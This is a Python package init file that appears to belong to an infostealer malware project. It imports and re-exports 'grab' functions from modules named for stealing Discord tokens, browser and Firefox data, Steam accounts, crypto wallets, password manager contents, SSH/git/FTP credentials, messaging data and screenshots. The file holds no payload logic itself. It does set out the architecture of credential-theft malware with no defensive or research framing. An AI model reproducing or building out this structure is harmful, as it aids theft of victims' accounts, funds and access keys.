from .discord_stealer import grab as grab_discord
from .browser_stealer import grab as grab_browsers
from .steam_stealer import grab as grab_steam
from .screenshot import grab as grab_screenshot
from .userinformation import grab as grab_userinfo
from .installed_software import grab as grab_software
from .installed_browsers import grab as grab_browser_list
from .network_stealer import grab as grab_network
from .messaging_stealer import grab as grab_messaging
from .firefox_stealer import grab as grab_firefox
from .wallet_stealer import grab as grab_wallets
from .password_managers import grab as grab_password_managers
from .ssh_git_ftp import grab as grab_ssh_git_ftp
from .running_processes import grab as grab_processes

__all__ = [
    'grab_discord',
    'grab_browsers', 
    'grab_steam',
    'grab_screenshot',
    'grab_userinfo',
    'grab_software',
    'grab_browser_list',
    'grab_network',
    'grab_messaging',
    'grab_firefox',
    'grab_wallets',
    'grab_password_managers',
    'grab_ssh_git_ftp',
    'grab_processes'
]